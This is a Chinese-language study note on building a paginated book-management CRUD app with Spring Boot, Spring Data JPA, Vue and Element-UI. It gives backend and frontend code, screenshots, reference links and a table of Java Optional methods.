当访问/的时候希望跳转到/pageOne

<img src="Akio's Book.assets/image-20220117211705378.png" alt="image-20220117211705378" style="zoom:67%;" />





#### 前后端数据对接

##### 数据展示

首先我们element-ui选择一个带编辑的Table，赋值代码到PageOne.vue，并选择一个pagination分页，赋值代码到PagOne.vue中，但是要注意，<template>只允许有一个根目录，所以，我们用一个div将两个东西包起来

我们考虑到了分页，所以后端修改BookHandler

```java
@RestController
@RequestMapping("/book")
public class BookHandler {
    @Autowired
    private BookRepository bookRepository;

    @GetMapping("/findAll/{page}/{size}")
    public Page<Book> findAll(@PathVariable("page") Integer page, @PathVariable("size") Integer size) {
        PageRequest pageable = PageRequest.of(page-1, size);
        return bookRepository.findAll(pageable);
    }
}
```

![image-20220117215917369](Akio's Book.assets/image-20220117215917369.png)

前端中PageOne.vue

```vue
<template>
    <div>
        <el-table
                :data="tableData"
                border
                style="width: 100%">
            <el-table-column
                    fixed
                    prop="id"
                    label="编号"
                    width="150">
            </el-table-column>
            <el-table-column
                    prop="name"
                    label="书名"
                    width="120">
            </el-table-column>
            <el-table-column
                    prop="author"
                    label="作者"
                    width="120">
            </el-table-column>
            <el-table-column
                    fixed="right"
                    label="操作"
                    width="100">
                <template slot-scope="scope">
                    <el-button @click="handleClick(scope.row)" type="text" size="small">查看</el-button>
                    <el-button type="text" size="small">编辑</el-button>
                </template>
            </el-table-column>
        </el-table>
        <el-pagination
                background
                layout="prev, pager, next"
                :page-size="pageSize"
                :total="total"
                @current-change="page">
        </el-pagination>
    </div>
</template>

<script>
    export default {
        methods: {
            handleClick(row) {
                console.log(row);
            },
            page(currentPage) {
                const _this = this
                axios.get('http://localhost:8181/book/findAll/' + currentPage + '/6').then(function (response) {
                    _this.tableData = response.data.content
                    _this.pageSize = response.data.pageSize
                    _this.total = response.data.totalElements
                })
            }
        },
        created() {
            const _this = this
            axios.get('http://localhost:8181/book/findAll/1/6').then(function (response) {
                _this.tableData = response.data.content
                _this.pageSize = response.data.pageSize
                _this.total = response.data.totalElements
            })
        },
        data() {
            return {
                pageSize: null,
                total: null,
                tableData: []
            }
        }
    }
</script>
```

<img src="Akio's Book.assets/image-20220117222306382.png" alt="image-20220117222306382" style="zoom:50%;" />



#### CURD聚合

##### SPringboot后端

> 结合Spring Data JPA，我们可以简单的写出前端需要的方法
>
> <img src="Akio's Book.assets/image-20220118110129098.png" alt="image-20220118110129098" style="zoom:50%;" />
>
> 实体类Book
>
> ```java
> @Entity
> @Data
> public class Book {
>     @Id
>     @GeneratedValue(strategy = GenerationType.IDENTITY)
>     private Integer id;
>     private String name;
>     private String author;
> }
> ```
>
> BookRepository数据库接口
>
> ```java
> public interface BookRepository extends JpaRepository<Book, Integer> {
> }
> ```
>
> BookHandler控制器
>
> ```java
> @RestController
> @RequestMapping("/book")
> public class BookHandler {
>     @Autowired
>     private BookRepository bookRepository;
> 
>     @GetMapping("/findAll/{page}/{size}")
>     public Page<Book> findAll(@PathVariable("page") Integer page, @PathVariable("size") Integer size) {
>         PageRequest pageable = PageRequest.of(page, size);
>         return bookRepository.findAll(pageable);
>     }
> 
>     @PostMapping("/save")
>     public String save(@RequestBody Book book) {
>         Book result = bookRepository.save(book);
>         if (result != null) {
>             return "success";
>         } else {
>             return "error";
>         }
>     }
> 
>     @GetMapping("/findById/{id}")
>     public Book findById(@PathVariable("id") Integer id) {
>         return bookRepository.findById(id).get();
>         //Optional JDK1.8新特性
>         //get():如果创建的Optional中有值存在，则返回此值，否则抛出NoSuchElementException
>     }
> 
>     @PutMapping("/update")
>     public String update(@RequestBody Book book) {
>         Book result = bookRepository.save(book);
>         if (result != null) {
>             return "success";
>         } else {
>             return "error";
>         }
>     }
> 
>     @DeleteMapping("/deleteById/{id}")
>     public void deleteById(@PathVariable("id") Integer id) {
>         bookRepository.deleteById(id);
>     }
> }
> ```
>
> application.yml配置文件
>
> ```yml
> spring:
>   datasource:
>     url: jdbc:mysql://localhost:3306/library?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai
>     username: root
>     password: root
>     driver-class-name: com.mysql.cj.jdbc.Driver
>   jpa:
>     show-sql: true
>     properties:
>       hibernate:
>         format_sql: true
> server:
>   port: 8181
> ```



##### VUE前端

> <img src="Akio's Book.assets/image-20220118110826719.png" alt="image-20220118110826719" style="zoom:67%;" />
>
> router.js
>
> ```js
> import Vue from 'vue'
> import Router from 'vue-router'
> import App from "./App";
> import BookManage from "./views/BookManage";
> import AddBook from "./views/AddBook";
> import Index from "./views/Index"
> import BookUpdate from "./views/BookUpdate";
> 
> Vue.use(Router)
> 
> export default new Router({
>     mode: 'history',
>     base: process.env.BASE_URL,
>     routes: [
>         {
>             path: '/',
>             name: '图文管理',
>             show: true, //结合Index.vue的v-if进行显示
>             component: Index,
>             redirect: '/pageOne',
>             children: [
>                 {
>                     path: '/BookManage',
>                     name: '查询图书',
>                     component: BookManage
>                 },
>                 {
>                     path: '/AddBook',
>                     name: '添加图书',
>                     component: AddBook
>                 }
>             ]
>         },
>         {
>             path: '/',
>             name: '图文管理',
>             show: false, //结合Index.vue的v-if进行显示
>             component: Index,
>             redirect: '/pageOne',
>             children: [
>                 {
>                     path: '/update',
>                     name: '修改',
>                     show: false,
>                     component: BookUpdate
>                 }
>             ]
>         }
>     ]
> })
> ```
>
> App.vue
>
> ```vue
> <template>
>   <div id="app">
>     <router-view></router-view>
>   </div>
> </template>
> 
> <style>
>   .el-header {
>     background-color: #B3C0D1;
>     color: #333;
>     line-height: 60px;
>   }
> 
>   .el-aside {
>     color: #333;
>   }
> </style>
> 
> <script>
>   export default {
>     data() {
>       return {
>       }
>     }
>   };
> </script>
> ```
>
> Index.vue
>
> ```vue
> <template>
>     <el-container style="height: 500px; border: 1px solid #eee">
> 
>         <el-aside width="200px" style="background-color: rgb(238, 241, 246)">
>             <el-menu router :default-openeds="['0', '1']">
>                 <el-submenu v-for="(item,index) in $router.options.routes" :index="index+''" v-if="item.show">
>                     <template slot="title">{{item.name}}</template>
>                     <el-menu-item v-for="(item2,index2) in item.children" :index="item2.path"
>                                   :class="$route.path==item2.path?'is-active':''">{{item2.name}}</el-menu-item>
>                 </el-submenu>
>             </el-menu>
>         </el-aside>
> 
>         <el-main>
>             <router-view></router-view>
>         </el-main>
>     </el-container>
> </template>
> 
> <script>
>     export default {
>         name: "Index"
>     }
> </script>
> 
> <style scoped>
> 
> </style>
> ```
>
> BookManage.vue
>
> ```vue
> <template>
>     <div>
>         <el-table
>                 :data="tableData"
>                 border
>                 style="width: 70%">
>             <el-table-column
>                     fixed
>                     prop="id"
>                     label="编号"
>                     width="150">
>             </el-table-column>
>             <el-table-column
>                     prop="name"
>                     label="图书名"
>                     width="120">
>             </el-table-column>
>             <el-table-column
>                     prop="author"
>                     label="作者"
>                     width="120">
>             </el-table-column>
>             <el-table-column
>                     fixed="right"
>                     label="操作"
>                     width="100">
>                 <template slot-scope="scope">
>                     <el-button @click="edit(scope.row)" type="text" size="small">修改</el-button>
>                     <el-button @click="deleteBook(scope.row)" type="text" size="small">删除</el-button>
>                 </template>
>             </el-table-column>
>         </el-table>
> 
>         <el-pagination
>                 background
>                 layout="prev, pager, next"
>                 :page-size="pageSize"
>                 :total="total"
>                 @current-change="page">
>         </el-pagination>
>     </div>
> </template>
> 
> <script>
>     export default {
>         methods: {
>             deleteBook(row) {
>                 const _this = this
>                 axios.delete('http://localhost:8181/book/deleteById/' + row.id).then(function (resp) {
>                     _this.$alert('《' + row.name + '》删除成功！', '消息', {
>                         confirmButtonText: '确定',
>                         callback: action => {
>                             window.location.reload()	//js代码，自动刷新
>                         }
>                     })
>                 })
>             },
>             edit(row) {
>                 this.$router.push({ //加个{}，就可以携带参数
>                     path: '/update',
>                     query: {
>                         id: row.id
>                     }
>                 })
>             },
>             page(currentPage) {
>                 const _this = this
>                 axios.get('http://localhost:8181/book/findAll/' + (currentPage - 1) + '/6').then(function (resp) {
>                     console.log(resp)
>                     _this.tableData = resp.data.content
>                     _this.pageSize = resp.data.size
>                     _this.total = resp.data.totalElements
>                 })
>             }
>         },
> 
>         data() {
>             return {
>                 pageSize: null,
>                 total: null,
>                 tableData: []
>             }
>         },
> 
>         created() {
>             const _this = this
>             axios.get('http://localhost:8181/book/findAll/0/6').then(function (resp) {
>                 console.log(resp)
>                 _this.tableData = resp.data.content
>                 _this.pageSize = resp.data.size
>                 _this.total = resp.data.totalElements
>             })
>         }
>     }
> </script>
> ```
>
> AddBook.vue
>
> ```vue
> <template>
>     <el-form style="width: 60%" :model="ruleForm" :rules="rules" ref="ruleForm" label-width="100px" class="demo-ruleForm">
> 
>         <el-form-item label="图书名称" prop="name">
>             <el-input v-model="ruleForm.name"></el-input>
>         </el-form-item>
> 
>         <el-form-item label="作者" prop="author">
>             <el-input v-model="ruleForm.author"></el-input>
>         </el-form-item>
> 
>         <el-form-item>
>             <el-button type="primary" @click="submitForm('ruleForm')">提交</el-button>
>             <el-button @click="resetForm('ruleForm')">重置</el-button>
>         </el-form-item>
> 
>     </el-form>
> </template>
> 
> <script>
>     export default {
>         data() {
>             return {
>                 ruleForm: {
>                     name: '',
>                     author: ''
>                 },
>                 rules: {
>                     name: [
>                         { required: true, message: '图书名称不能为空', trigger: 'blur' }
>                     ],
>                     author:[
>                         { required: true, message: '作者不能为空', trigger: 'blur' }
>                     ]
>                 }
>             };
>         },
>         methods: {
>             submitForm(formName) {
>                 const _this = this
>                 this.$refs[formName].validate((valid) => {
>                     if (valid) {
>                         axios.post('http://localhost:8181/book/save',this.ruleForm).then(function(resp){
>                             if(resp.data == 'success'){
>                                 _this.$alert('《'+_this.ruleForm.name+'》添加成功！', '消息', {
>                                     confirmButtonText: '确定',
>                                     callback: action => {
>                                         _this.$router.push('/BookManage')
>                                     }
>                                 })
>                             }
>                         })
>                     } else {
>                         return false;
>                     }
>                 });
>             },
>             resetForm(formName) {
>                 this.$refs[formName].resetFields();
>             }
>         }
>     }
> </script>
> ```
>
> BookUpdate.vue
>
> ```vue
> <template>
>     <el-form style="width: 60%" :model="ruleForm" :rules="rules" ref="ruleForm" label-width="100px" class="demo-ruleForm">
>         <!--:rules表示当前表单接受验证规则，与下面的prop结合使用--><!--ref="ruleForm"表示映射，与下面submitForm('ruleForm')结合使用-->
>         <el-form-item label="图书编号">
>             <el-input v-model="ruleForm.id" readOnly></el-input>
>         </el-form-item>
>         <!--prop="name"用于选取名字为name的验证规则-->
>         <el-form-item label="图书名称" prop="name">
>             <el-input v-model="ruleForm.name"></el-input>
>         </el-form-item>
> 
>         <el-form-item label="作者" prop="author">
>             <el-input v-model="ruleForm.author"></el-input>
>         </el-form-item>
> 
>         <el-form-item>
>             <el-button type="primary" @click="submitForm('ruleForm')">修改</el-button>
>             <el-button @click="resetForm('ruleForm')">重置</el-button>
>         </el-form-item>
> 
>     </el-form>
> </template>
> 
> <script>
>     export default {
>         data() {
>             return {
>                 ruleForm: {
>                     id: '',
>                     name: '',
>                     author: ''
>                 },
>                 rules: {    //验证规则
>                     name: [
>                         { required: true, message: '图书名称不能为空', trigger: 'blur' } // trigger: 'blur'失焦
>                     ],
>                     author:[
>                         { required: true, message: '作者不能为空', trigger: 'blur' }
>                     ]
>                 }
>             };
>         },
>         methods: {
>             submitForm(formName) {
>                 const _this = this
>                 this.$refs[formName].validate((valid) => {  //用于判断当前表单的所有数据均已通过验证
>                     if (valid) {
>                         axios.put('http://localhost:8181/book/update',this.ruleForm).then(function(resp){
>                             if(resp.data == 'success'){
>                                 _this.$alert('《'+_this.ruleForm.name+'》修改成功！', '消息', {
>                                     confirmButtonText: '确定',
>                                     callback: action => {
>                                         _this.$router.push('/BookManage')
>                                     }
>                                 })
>                             }
>                         })
>                     } else {
>                         return false;
>                     }
>                 });
>             },
>             resetForm(formName) {
>                 this.$refs[formName].resetFields();
>             }
>         },
>         created() {
>             const _this = this
>             axios.get('http://localhost:8181/book/findById/'+this.$route.query.id).then(function(resp){
>                 _this.ruleForm = resp.data
>             })
>         }
>     }
> </script>
> ```



##### 效果图

<img src="Akio's Book.assets/image-20220118111142465.png" alt="image-20220118111142465" style="zoom:50%;" /><img src="Akio's Book.assets/image-20220118111151360.png" alt="image-20220118111151360" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220118111204293.png" alt="image-20220118111204293" style="zoom:50%;" />











## Element-UI

https://www.bilibili.com/video/BV17m4y1Q7gn?from=search&seid=13120601889511423979&spm_id_from=333.337.0.0	Element-ui+SpringBoot



## JsonResult





## 前端html转word



## NOTICE

### [微信小程序使用nginx方向代理实现内嵌非业务域名](https://www.cnblogs.com/kenwar/p/8288882.html)

> https://www.cnblogs.com/kenwar/p/8288882.html



### Optional JDK1.8新特性

> https://blog.csdn.net/zknxx/article/details/78586799
>
> 在我们的开发中，NullPointerException可谓是随时随处可见，为了避免空指针异常，我们常常需要进行一些防御式的检查，所以在代码中常常可见if(obj != null) 这样的判断。
>
> 所幸在在JDK1.8的新特性中，java为我们提供了一个Optional类，Optional类能让我们省掉繁琐的非空的判断。
>
> 下面先说一下Optional中为我们提供的方法
>
> |    方法     | 描述                                                         |
> | :---------: | ------------------------------------------------------------ |
> |     of      | 把指定的值封装为Optional对象，如果指定的值为null，则抛出NullPointerException |
> |    empty    | 创建一个空的Optional对象                                     |
> | ofNullable  | 把指定的值封装为Optional对象，如果指定的值为null，则创建一个空的Optional对象 |
> |     get     | 如果创建的Optional中有值存在，则返回此值，否则抛出NoSuchElementException |
> |   orElse    | 如果创建的Optional中有值存在，则返回此值，否则返回一个默认值 |
> |  orElseGet  | 如果创建的Optional中有值存在，则返回此值，否则返回一个由Supplier接口生成的值 |
> | orElseThrow | 如果创建的Optional中有值存在，则返回此值，否则抛出一个由指定的Supplier接口生成的异常 |
> |   filter    | 如果创建的Optional中的值满足filter中的条件，则返回包含该值的Optional对象，否则返回一个空的Optional对象 |
> |     map     | 如果创建的Optional中的值存在，对该值执行提供的Function函数调用 |
> |   flagMap   | 如果创建的Optional中的值存在，就对该值执行提供的Function函数调用，返回一个Optional类型的值，否则就返回一个空的Optional对象 |
> |  isPresent  | 如果创建的Optional中的值存在，返回true，否则返回false        |
> |  ifPresent  | 如果创建的Optional中的值存在，则执行该方法的调用，否则什么也不做 |



### input file如何限制上传的文件类型

https://www.feiniaomy.com/post/520.html









